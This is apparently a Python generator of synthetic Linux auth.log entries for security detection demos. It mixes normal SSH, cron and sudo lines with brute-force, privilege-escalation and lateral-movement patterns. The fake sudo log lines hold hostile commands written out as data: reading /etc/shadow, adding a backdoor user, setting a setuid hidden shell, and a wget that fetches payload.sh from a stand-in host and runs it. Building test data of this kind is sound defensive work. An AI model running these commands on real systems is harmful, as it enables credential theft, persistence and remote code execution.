"""
Synthetic Auth.log Generator — Generates Linux auth.log entries with
injected attack patterns for deterministic demo and testing scenarios.

Attack patterns:
    - Brute force: 20 failed SSH attempts from one IP within 90s targeting 4 users
    - Privilege escalation: sudo commands from a compromised account
    - Impossible travel: SSH logins from geographically distant IPs in quick succession
"""

import random
from datetime import datetime, timedelta
from typing import Generator

# ─── Configuration ───────────────────────────────────────────────────────────

LEGITIMATE_USERS = ["alice", "bob", "charlie", "deploy", "jenkins", "monitoring"]
SERVICE_ACCOUNTS = ["svc-backup", "svc-monitoring", "svc-deploy", "svc-rotate"]
ATTACKER_IPS = ["203.0.113.44", "198.51.100.77", "192.0.2.111"]
LEGITIMATE_IPS = ["10.0.1.10", "10.0.1.22", "10.0.2.5", "172.16.0.15"]
TARGET_HOSTS = ["prod-db-03", "prod-cache-01", "prod-web-02", "staging-app-01"]

SSH_PORTS = list(range(49152, 49200))  # ephemeral source ports


def _fmt_ts(dt: datetime) -> str:
    """Format datetime as BSD syslog timestamp: 'Aug 10 09:14:22'"""
    return dt.strftime("%b %d %H:%M:%S")


def generate_normal_traffic(
    start_time: datetime,
    duration_minutes: int = 60,
    events_per_minute: float = 2.0,
    hostname: str = "prod-db-03",
) -> Generator[str, None, None]:
    """
    Generate benign auth.log traffic — normal SSH logins, CRON jobs, sudo commands.
    """
    current = start_time
    end_time = start_time + timedelta(minutes=duration_minutes)

    while current < end_time:
        interval = timedelta(seconds=random.expovariate(events_per_minute / 60.0))
        current += interval
        if current >= end_time:
            break

        ts = _fmt_ts(current)
        event_type = random.choices(
            ["ssh_success", "cron", "sudo", "session"],
            weights=[0.3, 0.3, 0.2, 0.2],
        )[0]

        if event_type == "ssh_success":
            user = random.choice(LEGITIMATE_USERS)
            ip = random.choice(LEGITIMATE_IPS)
            port = random.choice(SSH_PORTS)
            yield f"{ts} {hostname} sshd[{random.randint(1000,9999)}]: Accepted publickey for {user} from {ip} port {port} ssh2"

        elif event_type == "cron":
            user = random.choice(LEGITIMATE_USERS[:3])
            yield f"{ts} {hostname} CRON[{random.randint(1000,9999)}]: pam_unix(cron:session): session opened for user {user}(uid={random.randint(1000,2000)}) by (uid=0)"

        elif event_type == "sudo":
            user = random.choice(LEGITIMATE_USERS[:3])
            yield f"{ts} {hostname} sudo[{random.randint(1000,9999)}]: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/systemctl status nginx"

        elif event_type == "session":
            user = random.choice(LEGITIMATE_USERS)
            yield f"{ts} {hostname} sshd[{random.randint(1000,9999)}]: pam_unix(sshd:session): session opened for user {user}(uid={random.randint(1000,2000)}) by (uid=0)"


def generate_brute_force_attack(
    start_time: datetime,
    attacker_ip: str = "203.0.113.44",
    target_users: list[str] | None = None,
    num_attempts: int = 20,
    duration_seconds: float = 90.0,
    hostname: str = "prod-db-03",
) -> Generator[str, None, None]:
    """
    Generate a brute-force SSH attack pattern:
    - `num_attempts` failed password attempts from `attacker_ip`
    - Targets `target_users` (4 service accounts by default)
    - Compressed within `duration_seconds` (90s by default)

    This is the deterministic demo scenario described in the plan.
    """
    if target_users is None:
        target_users = SERVICE_ACCOUNTS[:4]

    interval = duration_seconds / num_attempts
    current = start_time

    for i in range(num_attempts):
        user = target_users[i % len(target_users)]
        port = random.choice(SSH_PORTS)
        ts = _fmt_ts(current)
        pid = random.randint(10000, 19999)

        # Emit the "Invalid user" line for non-existent users (first pass)
        if i < len(target_users):
            yield f"{ts} {hostname} sshd[{pid}]: Invalid user {user} from {attacker_ip} port {port}"

        # Emit the "Failed password" line
        yield f"{ts} {hostname} sshd[{pid}]: Failed password for {'invalid user ' if i < len(target_users) else ''}{user} from {attacker_ip} port {port} ssh2"

        # PAM failure too
        yield f"{ts} {hostname} sshd[{pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={attacker_ip} user={user}"

        current += timedelta(seconds=interval + random.uniform(-0.5, 0.5))


def generate_privilege_escalation(
    start_time: datetime,
    compromised_user: str = "svc-backup",
    hostname: str = "prod-db-03",
) -> Generator[str, None, None]:
    """
    Generate a privilege escalation pattern:
    - Suspicious sudo commands from a service account
    - Adding a new user
    - Modifying sudoers
    """
    current = start_time
    pid = random.randint(20000, 29999)

    suspicious_commands = [
        f"/usr/bin/cat /etc/shadow",
        f"/usr/sbin/useradd -m -s /bin/bash backdoor_user",
        f"/usr/bin/chmod 4755 /tmp/.hidden_shell",
        f"/usr/bin/wget http://198.51.100.77/payload.sh -O /tmp/.payload.sh",
        f"/bin/bash /tmp/.payload.sh",
    ]

    for cmd in suspicious_commands:
        ts = _fmt_ts(current)
        yield f"{ts} {hostname} sudo[{pid}]: {compromised_user} : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND={cmd}"
        current += timedelta(seconds=random.uniform(3, 15))
        pid += 1


def generate_lateral_movement(
    start_time: datetime,
    source_ip: str = "10.0.4.12",
    target_hosts: list[str] | None = None,
    compromised_user: str = "svc-backup",
) -> Generator[str, None, None]:
    """
    Generate a lateral movement pattern:
    - SSH connections from an internal host to multiple other internal hosts
    - Using the same compromised service account
    """
    if target_hosts is None:
        target_hosts = ["prod-cache-01", "prod-web-02", "staging-app-01", "prod-db-04", "prod-log-01"]

    current = start_time

    for host in target_hosts:
        ts = _fmt_ts(current)
        port = random.choice(SSH_PORTS)
        pid = random.randint(30000, 39999)

        yield f"{ts} {host} sshd[{pid}]: Accepted publickey for {compromised_user} from {source_ip} port {port} ssh2"
        yield f"{ts} {host} sshd[{pid}]: pam_unix(sshd:session): session opened for user {compromised_user}(uid=1001) by (uid=0)"

        current += timedelta(seconds=random.uniform(10, 45))


def generate_full_scenario(
    start_time: datetime | None = None,
    hostname: str = "prod-db-03",
) -> Generator[str, None, None]:
    """
    Generate a complete multi-stage attack scenario:

    1. T+0min:   Normal background traffic begins
    2. T+5min:   Brute-force SSH attack (20 attempts / 90s)
    3. T+7min:   Privilege escalation commands
    4. T+10min:  Lateral movement to 5 other hosts
    5. T+15min:  Normal traffic continues

    This is the deterministic end-to-end demo scenario for Day 5.
    """
    if start_time is None:
        start_time = datetime.utcnow()

    # Phase 1: Normal traffic (5 minutes)
    yield from generate_normal_traffic(
        start_time=start_time,
        duration_minutes=5,
        events_per_minute=3.0,
        hostname=hostname,
    )

    # Phase 2: Brute-force attack at T+5min
    attack_start = start_time + timedelta(minutes=5)
    yield from generate_brute_force_attack(
        start_time=attack_start,
        attacker_ip="203.0.113.44",
        hostname=hostname,
    )

    # Phase 3: Privilege escalation at T+7min
    priv_esc_start = start_time + timedelta(minutes=7)
    yield from generate_privilege_escalation(
        start_time=priv_esc_start,
        hostname=hostname,
    )

    # Phase 4: Lateral movement at T+10min
    lateral_start = start_time + timedelta(minutes=10)
    yield from generate_lateral_movement(
        start_time=lateral_start,
        source_ip="10.0.4.12",  # IP of prod-db-03 (compromised host)
    )

    # Phase 5: Normal traffic continues (5 more minutes)
    yield from generate_normal_traffic(
        start_time=start_time + timedelta(minutes=15),
        duration_minutes=5,
        events_per_minute=2.0,
        hostname=hostname,
    )


if __name__ == "__main__":
    """Generate and print a full scenario to stdout for testing."""
    for line in generate_full_scenario():
        print(line)
